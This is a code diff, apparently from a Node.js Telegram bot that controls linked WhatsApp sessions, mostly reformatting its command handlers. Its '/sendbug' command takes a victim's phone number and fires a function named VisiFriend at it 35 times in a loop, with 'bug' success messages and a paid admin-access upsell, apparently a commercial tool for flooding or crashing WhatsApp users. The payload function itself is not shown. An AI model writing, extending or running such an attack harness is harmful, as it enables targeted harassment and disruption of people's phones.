-  for (let i = 0; i < 35; i++) {
-    await VisiFriend(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /sendbug 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 35; i++) {
+        await VisiFriend(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/reqpair (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
-    return bot.sendPhoto(chatId, thumbnailUrl, {
-      caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]]
-      }
-    })
-  }
+    const chatId = msg.chat.id;
+    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
+        return bot.sendPhoto(chatId, thumbnailUrl, {
+            caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]]
+            }
+        });
+    }
 
-  if (!match[1]) {
-    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.")
-  }
-  
-  const botNumber = match[1].replace(/[^0-9]/g, "")
-
-  if (!botNumber || botNumber.length < 10) {
-    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.")
-  }
-
-  try {
-    await ConnectToWhatsApp(botNumber, chatId)
-  } catch (error) {
-    console.error("Error in Connect:", error)
-    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.")
-  }
-})
+    if (!match[1]) {
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.");
+    }
+    
+    const botNumber = match[1].replace(/[^0-9]/g, "");
+    
+    if (!botNumber || botNumber.length < 10) {
+        return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
+    }
+    
+    try {
+        await ConnectToWhatsApp(botNumber, chatId);
+    } catch (error) {
+        console.error("Error in Connect:", error);
+        bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
+    }
+});
 
 process.on('unhandledRejection', (reason, promise) => {
-  console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
+    console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
 });
 
 process.on('uncaughtException', (error) => {
-  console.error(chalk.red('Uncaught Exception:', error));
+    console.error(chalk.red('Uncaught Exception:', error));
 });
 
 startAutoUpdateChecker();
